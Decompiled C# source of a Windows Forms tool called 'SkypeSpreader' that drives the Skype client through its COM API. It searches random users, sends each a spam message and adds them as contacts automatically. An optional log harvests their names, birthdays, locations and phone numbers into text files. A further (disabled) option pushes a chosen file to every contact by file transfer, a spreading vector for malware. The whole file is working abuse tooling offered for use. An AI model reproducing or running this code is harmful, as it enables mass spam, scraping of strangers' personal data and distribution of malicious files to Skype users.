using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using SKYPE4COMLib;
using ns1;

namespace ns2;

internal sealed class Form2 : Form
{
	internal enum Enum0
	{
		const_0,
		const_1,
		const_2,
		const_3,
		const_4,
		const_5,
		const_6
	}

	private Skype skype_0;

	private bool bool_0 = false;

	private StreamWriter streamWriter_0;

	private int int_0;

	private int int_1 = 0;

	private Random random_0 = new Random();

	private string string_0;

	private ApplicationStream applicationStream_0 = null;

	private Control control_0 = null;

	private Enum0 enum0_0;

	private IContainer icontainer_0 = null;

	private Button button2;

	private ListBox list_realtime_names;

	private OpenFileDialog openFileDialog_0;

	private Label label2;

	private Label label1;

	private TextBox T_realtime_teller;

	private TextBox T_spam;

	private CheckBox check_log;

	private Button B_start;

	private TextBox T_maxusers;

	private Label label5;

	private Button B_exit;

	private CheckBox check_buddyadd;

	private CheckBox check_auto_file;

	private CheckBox check_spam;

	private GroupBox group_opties;

	private TextBox T_fileName;

	private Label label3;

	private Label label4;

	private NumericUpDown num_delay;

	public Form2()
	{
		//IL_003c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0046: Expected O, but got Unknown
		//IL_00dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f0: Unknown result type (might be due to invalid IL or missing references)
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form2_FormClosing));
		InitializeComponent();
		enum0_0 = Enum0.const_0;
		string_0 = "SkypeSpreader";
		skype_0 = new SkypeClass();
		ISkype skype = skype_0;
		try
		{
			skype_0.Attach(5, Wait: false);
		}
		catch (Exception)
		{
		}
		if (skype.AttachmentStatus == TAttachmentStatus.apiAttachNotAvailable || skype.AttachmentStatus == TAttachmentStatus.apiAttachRefused)
		{
			enum0_0 = Enum0.const_1;
			return;
		}
		enum0_0 = Enum0.const_2;
		if (!skype_0.Client.IsRunning)
		{
			skype_0.Client.Start();
		}
		MessageBox.Show("BEWARE!! This app. is not meant for resale , genuine apps come from uniQ_ only. All other versions out there are mostly scam-based or backdoors to your private life. BEWARE!!", "Important Info!", (MessageBoxButtons)0, (MessageBoxIcon)48);
		MessageBox.Show("Be sure to login first ,before using the spreader! otherwise the spreader won't work!", "Important Info!", (MessageBoxButtons)0, (MessageBoxIcon)64);
	}

	private void Form2_FormClosing(object sender, FormClosingEventArgs e)
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0013: Invalid comparison between Unknown and I4
		if ((int)MessageBox.Show("Are you sure you want to quit?", "Exit?", (MessageBoxButtons)4, (MessageBoxIcon)32) == 7)
		{
			((CancelEventArgs)(object)e).Cancel = true;
		}
	}

	private void button2_Click(object sender, EventArgs e)
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_0017: Invalid comparison between Unknown and I4
		((TextBoxBase)T_fileName).Clear();
		if ((int)((CommonDialog)openFileDialog_0).ShowDialog() == 1)
		{
			((Control)T_fileName).set_Text(((FileDialog)openFileDialog_0).get_FileName());
		}
	}

	private void B_start_Click(object sender, EventArgs e)
	{
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_00eb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0254: Unknown result type (might be due to invalid IL or missing references)
		//IL_0277: Unknown result type (might be due to invalid IL or missing references)
		bool_0 = check_log.get_Checked();
		int result = 0;
		if (!int.TryParse(((Control)T_maxusers).get_Text(), out result))
		{
			MessageBox.Show("Hey Shit Face only numbers!");
			return;
		}
		if (((Control)T_spam).get_Text().Length == 0)
		{
			MessageBox.Show("Hey KnunkleHead Enter a Text!");
			return;
		}
		string text = "LogUsers";
		int i;
		for (i = 1; File.Exists(text + i + ".txt"); i++)
		{
		}
		streamWriter_0 = new StreamWriter(text + i + ".txt");
		MessageBox.Show("Spreader Starting! it may seem like the program is hanging but it is not!", "Spreader", (MessageBoxButtons)0, (MessageBoxIcon)64);
		int_0 = 0;
		int utf = random_0.Next(97, 123);
		if (check_auto_file.get_Checked())
		{
			MessageBox.Show("File will be send to all accepted buddys!", "Spreader", (MessageBoxButtons)0, (MessageBoxIcon)64);
			UserCollection friends = skype_0.Friends;
			{
				foreach (User item in friends)
				{
					if (item.BuddyStatus == TBuddyStatus.budFriend)
					{
						Command command = new CommandClass();
						command.Command = "OPEN FILETRANSFER " + item.Handle + " IN " + ((Control)T_fileName).get_Text();
						skype_0.SendCommand(command);
					}
				}
				return;
			}
		}
		while (true)
		{
			try
			{
				UserCollectionClass userCollectionClass = (UserCollectionClass)skype_0.SearchForUsers(char.ConvertFromUtf32(utf).ToString());
				foreach (User item2 in userCollectionClass)
				{
					if (result != int_0)
					{
						if (num_delay.get_Value() != 0m)
						{
							Thread.Sleep(Convert.ToInt32(num_delay.get_Value()) * 1000);
						}
						method_0(item2, ((Control)T_spam).get_Text(), ((FileDialog)openFileDialog_0).get_FileName());
						((Control)this).Refresh();
						Application.DoEvents();
						continue;
					}
					streamWriter_0.Close();
					MessageBox.Show("Spread Finished!", "Spreader", (MessageBoxButtons)0, (MessageBoxIcon)64);
					if (check_log.get_Checked())
					{
						MessageBox.Show("Logfile Created!", "Spreader", (MessageBoxButtons)0, (MessageBoxIcon)64);
					}
					return;
				}
			}
			catch
			{
			}
			((Control)this).Refresh();
			utf = random_0.Next(97, 123);
		}
	}

	private void method_0(User user_0, string string_1, string string_2)
	{
		if (check_spam.get_Checked() && user_0.Handle != "")
		{
			skype_0.SendMessage(user_0.Handle, string_1);
		}
		if (check_buddyadd.get_Checked())
		{
			skype_0.Friends.Add(user_0);
		}
		if (bool_0 && user_0.FullName != "")
		{
			streamWriter_0.WriteLine("FullName = " + user_0.FullName);
			streamWriter_0.WriteLine("UserName = " + user_0.Handle);
			streamWriter_0.WriteLine("DisplayName = " + user_0.DisplayName);
			streamWriter_0.WriteLine("About = " + user_0.About);
			streamWriter_0.WriteLine("Aliases = " + user_0.Aliases);
			streamWriter_0.WriteLine("BirthDay = " + user_0.Birthday.ToShortDateString());
			streamWriter_0.WriteLine("City = " + user_0.City);
			streamWriter_0.WriteLine("Country = " + user_0.Country);
			streamWriter_0.WriteLine("CountryCode = " + user_0.CountryCode);
			streamWriter_0.WriteLine("Homepage = " + user_0.Homepage);
			streamWriter_0.WriteLine("Language = " + user_0.Language);
			streamWriter_0.WriteLine("LanguageCode = " + user_0.LanguageCode);
			streamWriter_0.WriteLine("MoodText = " + user_0.MoodText);
			streamWriter_0.WriteLine("PhoneHome = " + user_0.PhoneHome);
			streamWriter_0.WriteLine("PhoneMobile = " + user_0.PhoneMobile);
			streamWriter_0.WriteLine("PhoneOffice = " + user_0.PhoneOffice);
			streamWriter_0.WriteLine("Province = " + user_0.Province);
			streamWriter_0.WriteLine("Sex = " + user_0.Sex);
			streamWriter_0.WriteLine("-------------------------------------");
		}
		int_0++;
		((Control)T_realtime_teller).set_Text(int_0.ToString());
		list_realtime_names.get_Items().Add((object)user_0.FullName);
	}

	private void B_exit_Click(object sender, EventArgs e)
	{
		((Form)this).Close();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Expected O, but got Unknown
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Expected O, but got Unknown
		//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ec: Expected O, but got Unknown
		//IL_01de: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e8: Expected O, but got Unknown
		//IL_0ace: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ad8: Expected O, but got Unknown
		//IL_0b6b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b75: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form2));
		button2 = new Button();
		list_realtime_names = new ListBox();
		openFileDialog_0 = new OpenFileDialog();
		label2 = new Label();
		label1 = new Label();
		T_realtime_teller = new TextBox();
		T_spam = new TextBox();
		check_log = new CheckBox();
		B_start = new Button();
		T_maxusers = new TextBox();
		label5 = new Label();
		B_exit = new Button();
		check_buddyadd = new CheckBox();
		check_auto_file = new CheckBox();
		check_spam = new CheckBox();
		group_opties = new GroupBox();
		label4 = new Label();
		num_delay = new NumericUpDown();
		T_fileName = new TextBox();
		label3 = new Label();
		((Control)group_opties).SuspendLayout();
		((ISupportInitialize)num_delay).BeginInit();
		((Control)this).SuspendLayout();
		((Control)button2).set_BackgroundImage((Image)(object)Class9.smethod_1());
		((Control)button2).set_BackgroundImageLayout((ImageLayout)3);
		((Control)button2).set_Enabled(false);
		((ButtonBase)button2).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)button2).set_FlatStyle((FlatStyle)0);
		((Control)button2).set_Location(new Point(196, 317));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(98, 41));
		((Control)button2).set_TabIndex(17);
		((ButtonBase)button2).set_UseVisualStyleBackColor(true);
		((Control)button2).add_Click((EventHandler)button2_Click);
		((Control)list_realtime_names).set_BackColor(Color.Blue);
		((Control)list_realtime_names).set_Font(new Font("Microsoft Sans Serif", 10f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)list_realtime_names).set_ForeColor(Color.Red);
		((ListControl)list_realtime_names).set_FormattingEnabled(true);
		list_realtime_names.set_ItemHeight(16);
		((Control)list_realtime_names).set_Location(new Point(618, 129));
		((Control)list_realtime_names).set_Name("list_realtime_names");
		((Control)list_realtime_names).set_Size(new Size(192, 164));
		((Control)list_realtime_names).set_TabIndex(25);
		((FileDialog)openFileDialog_0).set_Filter("\"All Files (*.*)|*.*\"");
		((FileDialog)openFileDialog_0).set_Title("Open File");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_BackColor(Color.Transparent);
		((Control)label2).set_Location(new Point(664, 107));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(91, 13));
		((Control)label2).set_TabIndex(24);
		((Control)label2).set_Text("AfterTime Names:");
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_BackColor(Color.Transparent);
		((Control)label1).set_Location(new Point(620, 80));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(84, 13));
		((Control)label1).set_TabIndex(23);
		((Control)label1).set_Text("AfterTime Teller:");
		((Control)T_realtime_teller).set_Location(new Point(710, 77));
		((Control)T_realtime_teller).set_Name("T_realtime_teller");
		((TextBoxBase)T_realtime_teller).set_ReadOnly(true);
		((Control)T_realtime_teller).set_Size(new Size(100, 20));
		((Control)T_realtime_teller).set_TabIndex(22);
		((Control)T_spam).set_Location(new Point(12, 129));
		((TextBoxBase)T_spam).set_Multiline(true);
		((Control)T_spam).set_Name("T_spam");
		((Control)T_spam).set_Size(new Size(282, 184));
		((Control)T_spam).set_TabIndex(16);
		((Control)check_log).set_AutoSize(true);
		((Control)check_log).set_BackColor(Color.Transparent);
		((Control)check_log).set_Location(new Point(6, 13));
		((Control)check_log).set_Name("check_log");
		((Control)check_log).set_Size(new Size(194, 17));
		((Control)check_log).set_TabIndex(21);
		((Control)check_log).set_Text("Activate Personal Information Log ?");
		((ButtonBase)check_log).set_UseVisualStyleBackColor(false);
		((Control)B_start).set_BackgroundImage((Image)(object)Class9.smethod_3());
		((Control)B_start).set_BackgroundImageLayout((ImageLayout)3);
		((ButtonBase)B_start).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)B_start).set_FlatStyle((FlatStyle)0);
		((Control)B_start).set_Location(new Point(673, 325));
		((Control)B_start).set_Name("B_start");
		((Control)B_start).set_Size(new Size(82, 38));
		((Control)B_start).set_TabIndex(18);
		((ButtonBase)B_start).set_UseVisualStyleBackColor(true);
		((Control)B_start).add_Click((EventHandler)B_start_Click);
		((Control)T_maxusers).set_Location(new Point(491, 81));
		((Control)T_maxusers).set_Name("T_maxusers");
		((Control)T_maxusers).set_Size(new Size(100, 20));
		((Control)T_maxusers).set_TabIndex(20);
		((Control)T_maxusers).set_Text("10");
		((Control)label5).set_AutoSize(true);
		((Control)label5).set_BackColor(Color.Transparent);
		((Control)label5).set_Location(new Point(379, 84));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(109, 13));
		((Control)label5).set_TabIndex(19);
		((Control)label5).set_Text("Max. Random Users :");
		((Control)B_exit).set_BackgroundImage((Image)(object)Class9.smethod_2());
		((Control)B_exit).set_BackgroundImageLayout((ImageLayout)3);
		((ButtonBase)B_exit).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)B_exit).set_FlatStyle((FlatStyle)0);
		((Control)B_exit).set_Location(new Point(726, 24));
		((Control)B_exit).set_Name("B_exit");
		((Control)B_exit).set_Size(new Size(75, 47));
		((Control)B_exit).set_TabIndex(26);
		((ButtonBase)B_exit).set_UseVisualStyleBackColor(true);
		((Control)B_exit).add_Click((EventHandler)B_exit_Click);
		((Control)check_buddyadd).set_AutoSize(true);
		((Control)check_buddyadd).set_BackColor(Color.Transparent);
		((Control)check_buddyadd).set_Location(new Point(6, 37));
		((Control)check_buddyadd).set_Name("check_buddyadd");
		((Control)check_buddyadd).set_Size(new Size(176, 17));
		((Control)check_buddyadd).set_TabIndex(27);
		((Control)check_buddyadd).set_Text("Activate Automatic Buddy Add?");
		((ButtonBase)check_buddyadd).set_UseVisualStyleBackColor(false);
		((Control)check_auto_file).set_AutoSize(true);
		((Control)check_auto_file).set_BackColor(Color.Transparent);
		((Control)check_auto_file).set_Enabled(false);
		((Control)check_auto_file).set_Location(new Point(6, 60));
		((Control)check_auto_file).set_Name("check_auto_file");
		((Control)check_auto_file).set_Size(new Size(196, 17));
		((Control)check_auto_file).set_TabIndex(28);
		((Control)check_auto_file).set_Text("Activate Auto-send file to all Buddy?");
		((ButtonBase)check_auto_file).set_UseVisualStyleBackColor(false);
		((Control)check_spam).set_AutoSize(true);
		((Control)check_spam).set_BackColor(Color.Transparent);
		check_spam.set_Checked(true);
		check_spam.set_CheckState((CheckState)1);
		((Control)check_spam).set_Enabled(false);
		((Control)check_spam).set_Location(new Point(6, 83));
		((Control)check_spam).set_Name("check_spam");
		((Control)check_spam).set_Size(new Size(125, 17));
		((Control)check_spam).set_TabIndex(29);
		((Control)check_spam).set_Text("Activate Spam Text?");
		((ButtonBase)check_spam).set_UseVisualStyleBackColor(false);
		((Control)group_opties).set_BackColor(Color.Transparent);
		((Control)group_opties).get_Controls().Add((Control)(object)label4);
		((Control)group_opties).get_Controls().Add((Control)(object)num_delay);
		((Control)group_opties).get_Controls().Add((Control)(object)check_log);
		((Control)group_opties).get_Controls().Add((Control)(object)check_spam);
		((Control)group_opties).get_Controls().Add((Control)(object)check_buddyadd);
		((Control)group_opties).get_Controls().Add((Control)(object)check_auto_file);
		((Control)group_opties).set_Location(new Point(409, 129));
		((Control)group_opties).set_Name("group_opties");
		((Control)group_opties).set_Size(new Size(203, 140));
		((Control)group_opties).set_TabIndex(30);
		group_opties.set_TabStop(false);
		((Control)group_opties).set_Text("Settings");
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_BackColor(Color.Transparent);
		((Control)label4).set_Location(new Point(13, 113));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(66, 13));
		((Control)label4).set_TabIndex(31);
		((Control)label4).set_Text("Delay (sec) :");
		((Control)num_delay).set_Location(new Point(85, 111));
		num_delay.set_Maximum(new decimal(new int[4] { 60, 0, 0, 0 }));
		((Control)num_delay).set_Name("num_delay");
		((Control)num_delay).set_Size(new Size(43, 20));
		((Control)num_delay).set_TabIndex(30);
		((UpDownBase)num_delay).set_TextAlign((HorizontalAlignment)1);
		((Control)T_fileName).set_Location(new Point(124, 360));
		((Control)T_fileName).set_Name("T_fileName");
		((TextBoxBase)T_fileName).set_ReadOnly(true);
		((Control)T_fileName).set_Size(new Size(170, 20));
		((Control)T_fileName).set_TabIndex(31);
		((Control)T_fileName).set_Text("Soon Available!");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_BackColor(Color.Transparent);
		((Control)label3).set_Font(new Font("Courier New", 27.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_ForeColor(Color.Black);
		((Control)label3).set_Location(new Point(360, 22));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(128, 41));
		((Control)label3).set_TabIndex(32);
		((Control)label3).set_Text("v1.02");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackgroundImage((Image)componentResourceManager.GetObject("$this.BackgroundImage"));
		((Control)this).set_BackgroundImageLayout((ImageLayout)3);
		((Form)this).set_ClientSize(new Size(822, 398));
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)T_fileName);
		((Control)this).get_Controls().Add((Control)(object)group_opties);
		((Control)this).get_Controls().Add((Control)(object)B_exit);
		((Control)this).get_Controls().Add((Control)(object)button2);
		((Control)this).get_Controls().Add((Control)(object)list_realtime_names);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)T_realtime_teller);
		((Control)this).get_Controls().Add((Control)(object)T_spam);
		((Control)this).get_Controls().Add((Control)(object)B_start);
		((Control)this).get_Controls().Add((Control)(object)T_maxusers);
		((Control)this).get_Controls().Add((Control)(object)label5);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form2");
		((Control)this).set_Text("SkypeSpreader");
		((Control)group_opties).ResumeLayout(false);
		((Control)group_opties).PerformLayout();
		((ISupportInitialize)num_delay).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
